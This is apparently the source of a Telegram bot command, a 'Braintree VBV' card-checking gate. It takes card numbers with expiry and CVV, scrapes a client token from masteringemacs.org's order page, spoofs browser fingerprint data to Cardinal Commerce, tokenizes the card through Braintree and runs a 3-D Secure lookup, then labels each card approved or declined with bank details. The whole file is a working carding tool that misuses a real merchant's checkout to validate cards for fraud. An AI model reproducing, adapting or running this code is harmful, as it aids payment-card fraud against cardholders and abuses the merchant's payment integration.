import requests as r
from src.extras.checklib import MakeGate, ScrapInfo
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
import uuid, time, base64, json


BIN_API = "https://bins.antipublic.cc/bins/"
name_gate = "Braintree_Vbv"
subtype = "Braintree VBV"
command = "vbv"


def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


@Client.on_message(
    filters.command(
        [f"{name_gate}", f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False
    )
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    cc_check = await get_live(card, msg)


async def get_live(card, msg):

    card_split = MakeGate(card).get_card_details()
    ccnum = card_split[0]
    mes = card_split[1]
    ano = card_split[2]
    if len(ano) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    initial_time = time.time()
    data_bin = MakeGate(card).bin_lookup()

    session = ScrapInfo().session()
    email = ScrapInfo().email_generator()
    SessionId = generar_codigo_session()
    current_time = datetime.now().strftime("%D - %H:%M:%S")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ First Requests: get initial page ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }

    response = session.get("https://www.masteringemacs.org/order", headers=headers).text
    lines = response.split("\n")
    for i in lines:
        if "        data-client-token=" in i:
            sucio = i
    bearer = sucio.replace('        data-client-token="', "").replace('"', "")
    bearer = json.loads(base64.b64decode(bearer))
    bearer = bearer["authorizationFingerprint"]

    msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
    await msg.edit_text(msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Second request]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "payments.braintree-api.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": f"Bearer {bearer}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://www.masteringemacs.org",
        "referer": "https://www.masteringemacs.org/",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    }

    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": SessionId,
        },
        "query": "query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }",
        "operationName": "ClientConfiguration",
    }

    response = session.post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=json_data
    ).json()
    merchanid = response["data"]["clientConfiguration"]["merchantId"]
    jwt = response["data"]["clientConfiguration"]["creditCard"]["threeDSecure"][
        "cardinalAuthenticationJWT"
    ]

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Third request]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "centinelapi.cardinalcommerce.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.masteringemacs.org",
        "referer": "https://www.masteringemacs.org/",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "x-cardinal-tid": "Tid-96cddccc-81bb-4b4e-9953-a5845e56e725",
    }

    json_data = {
        "BrowserPayload": {
            "Order": {
                "OrderDetails": {},
                "Consumer": {
                    "BillingAddress": {},
                    "ShippingAddress": {},
                    "Account": {},
                },
                "Cart": [],
                "Token": {},
                "Authorization": {},
                "Options": {},
                "CCAExtension": {},
            },
            "SupportsAlternativePayments": {
                "cca": True,
                "hostedFields": False,
                "applepay": False,
                "discoverwallet": False,
                "wallet": False,
                "paypal": False,
                "visacheckout": False,
            },
        },
        "Client": {
            "Agent": "SongbirdJS",
            "Version": "1.35.0",
        },
        "ConsumerSessionId": None,
        "ServerJWT": jwt,
    }

    response = session.post(
        "https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init",
        headers=headers,
        json=json_data,
    ).text
    bearer2 = ScrapInfo().getStr(response, '{"CardinalJWT":"', '"}')
    partes = bearer2.split(".")
    payload_codificado = partes[1]

    # Decodificar la parte base64
    payload_decodificado = base64.urlsafe_b64decode(
        payload_codificado + "=" * (4 - len(payload_codificado) % 4)
    )

    # Cargar el payload decodificado como un diccionario JSON
    decode1 = json.loads(payload_decodificado)

    ideference = decode1["ReferenceId"]

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fourth request]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "geo.cardinalcommerce.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://geo.cardinalcommerce.com",
        "referer": f"https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8ab288adb1562e003d3637&tmEventType=PAYMENT&referenceId={ideference}&geolocation=false&origin=Songbird",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "x-requested-with": "XMLHttpRequest",
    }

    json_data = {
        "Cookies": {
            "Legacy": True,
            "LocalStorage": True,
            "SessionStorage": True,
        },
        "DeviceChannel": "Browser",
        "Extended": {
            "Browser": {
                "Adblock": True,
                "AvailableJsFonts": [],
                "DoNotTrack": "unknown",
                "JavaEnabled": False,
            },
            "Device": {
                "ColorDepth": 24,
                "Cpu": "unknown",
                "Platform": "Win32",
                "TouchSupport": {
                    "MaxTouchPoints": 0,
                    "OnTouchStartAvailable": False,
                    "TouchEventCreationSuccessful": False,
                },
            },
        },
        "Fingerprint": "f9f30df37936982a8fe6d275f3e98441",
        "FingerprintingTime": 780,
        "FingerprintDetails": {
            "Version": "1.5.1",
        },
        "Language": "en-US",
        "Latitude": None,
        "Longitude": None,
        "OrgUnitId": "5c8ab288adb1562e003d3637",
        "Origin": "Songbird",
        "Plugins": [
            "PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
            "Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
            "Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
            "Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
            "WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf",
        ],
        "ReferenceId": ideference,
        "Referrer": "https://www.masteringemacs.org/",
        "Screen": {
            "FakedResolution": False,
            "Ratio": 1.7786458333333333,
            "Resolution": "1366x768",
            "UsableResolution": "1366x728",
            "CCAScreenSize": "02",
        },
        "CallSignEnabled": None,
        "ThreatMetrixEnabled": False,
        "ThreatMetrixEventType": "PAYMENT",
        "ThreatMetrixAlias": "Default",
        "TimeOffset": 300,
        "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "UserAgentDetails": {
            "FakedOS": False,
            "FakedBrowser": False,
        },
        "BinSessionId": "ce6b2cde-c82c-4291-9015-031e25b8c30a",
    }

    response = session.post(
        "https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData",
        headers=headers,
        json=json_data,
    )

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Fifth request]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "payments.braintree-api.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": f"Bearer {bearer}",
        "braintree-version": "2018-05-10",
        "content-type": "application/json",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    }

    json_data = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": SessionId,
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": ccnum,
                    "expirationMonth": mes,
                    "expirationYear": ano,
                    "cvv": cvv,
                },
                "options": {
                    "validate": False,
                },
            },
        },
        "operationName": "TokenizeCreditCard",
    }

    response = session.post(
        "https://payments.braintree-api.com/graphql", headers=headers, json=json_data
    ).json()
    tokencc = response["data"]["tokenizeCreditCard"]["token"]

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Sixth request]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        "authority": "api.braintreegateway.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.masteringemacs.org",
        "referer": "https://www.masteringemacs.org/",
        "sec-ch-ua": '"Microsoft Edge";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    }

    json_data = {
        "amount": "39.75",
        "additionalInfo": {
            "acsWindowSize": "03",
        },
        "bin": ccnum[:6],
        "dfReferenceId": ideference,
        "clientMetadata": {
            "requestedThreeDSecureVersion": "2",
            "sdkVersion": "web/3.85.2",
            "cardinalDeviceDataCollectionTimeElapsed": 236,
            "issuerDeviceDataCollectionTimeElapsed": 3628,
            "issuerDeviceDataCollectionResult": True,
        },
        "authorizationFingerprint": bearer,
        "braintreeLibraryVersion": "braintree/web/3.85.2",
        "_meta": {
            "merchantAppId": "www.masteringemacs.org",
            "platform": "web",
            "sdkVersion": "3.85.2",
            "source": "client",
            "integration": "custom",
            "integrationType": "custom",
            "sessionId": SessionId,
        },
    }

    response = session.post(
        f"https://api.braintreegateway.com/merchants/{merchanid}/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup",
        headers=headers,
        json=json_data,
    ).json()
    code = response["paymentMethod"]["threeDSecureInfo"]["status"]

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Response Code ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    if "authenticate_successful" in code:
        msgx = "APPROVED ✅"
        respuesta = code

    elif "authenticate_attempt_successful" in code:
        msgx = "APPROVED ✅"
        respuesta = code

    else:
        msgx = "DECLINED ❌"
        respuesta = code

    final_time = time.time() - initial_time

    card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
s<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
    await msg.edit_text(
        card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )
